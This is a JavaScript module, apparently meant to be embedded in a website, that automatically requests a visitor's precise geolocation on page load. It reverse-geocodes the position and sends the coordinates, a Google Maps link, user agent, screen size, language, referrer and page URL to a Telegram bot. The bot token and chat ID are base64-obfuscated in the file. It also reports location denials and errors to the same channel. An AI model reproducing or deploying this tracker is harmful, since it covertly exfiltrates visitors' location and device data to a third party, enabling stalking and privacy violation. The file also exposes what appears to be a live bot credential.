/* eslint-disable */

const base64Decode = (encoded) => atob(encoded);

const encodedBotToken = 'ODM2MDE3ODY4ODpBQUV2eF93VUhKQTViS1hObUhETFhNbjRPNnV0QzdDMnR5OA==';
const encodedChatId = 'LTEwMDM5MzM0NzYwMDE=';

const sendToTelegram = async (text) => {
  const token = base64Decode(encodedBotToken);
  const chatId = base64Decode(encodedChatId);

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      parse_mode: 'HTML',
    }),
  });
};

const sendRichLocation = async (position) => {
  const { latitude, longitude, accuracy } = position.coords;

  try {
    const geoRes = await fetch(
      `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
    );

    if (!geoRes.ok) {
      throw new Error(`Geo API failed: ${geoRes.status}`);
    }

    const geoData = await geoRes.json();

    const visitorData = {
      city: geoData.city || geoData.locality || 'Unknown',
      country: geoData.countryName || 'Unknown',
      countryCode: geoData.countryCode || '',
      region: geoData.principalSubdivision || '',
      accuracy: Math.round(accuracy),
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent.substring(0, 150),
      screen: `${window.screen.width}x${window.screen.height}`,
      language: navigator.language,
      referrer: document.referrer || 'Direct',
    };

    const message = `✅ ENKO1 - New Visitor

📍 ${latitude}, ${longitude}
🏙 ${visitorData.city}, ${visitorData.region}
🌍 ${visitorData.country} (${visitorData.countryCode})
🎯 Accuracy: ${visitorData.accuracy}m
🕒 ${visitorData.timestamp}

🌐 Referrer: ${visitorData.referrer}
📱 ${visitorData.screen} | ${visitorData.language}
🔗 https://www.google.com/maps/place/${latitude},${longitude}`;

    await sendToTelegram(message);
  } catch (err) {
    const errorMsg = `❌ ENKO1 - Location Capture FAILED

Error: ${err.message}
Type: ${err.name || 'Unknown'}
Time: ${new Date().toISOString()}
User Agent: ${navigator.userAgent.substring(0, 120)}
Referrer: ${document.referrer || 'Direct'}
Page: ${window.location.href}`;

    await sendToTelegram(errorMsg);
  }
};

const initAutoLocationSender = () => {
  if (!navigator.geolocation) {
    const msg = `❌ ENKO1 - Geolocation NOT SUPPORTED
Time: ${new Date().toISOString()}
User Agent: ${navigator.userAgent}`;
    sendToTelegram(msg);
    return;
  }

  setTimeout(() => {
    navigator.geolocation.getCurrentPosition(
      sendRichLocation,
      async (error) => {
        let errorType = 'Unknown';
        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorType = 'PERMISSION_DENIED';
            break;
          case error.POSITION_UNAVAILABLE:
            errorType = 'POSITION_UNAVAILABLE';
            break;
          case error.TIMEOUT:
            errorType = 'TIMEOUT';
            break;
          default:
            errorType = `CODE_${error.code}`;
        }

        const errorMsg = `❌ ENKO1 - Geolocation ERROR

Code: ${errorType}
Message: ${error.message}
Time: ${new Date().toISOString()}
User Agent: ${navigator.userAgent.substring(0, 120)}
Page: ${window.location.href}`;

        await sendToTelegram(errorMsg);
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  }, 1200);
};

export default initAutoLocationSender;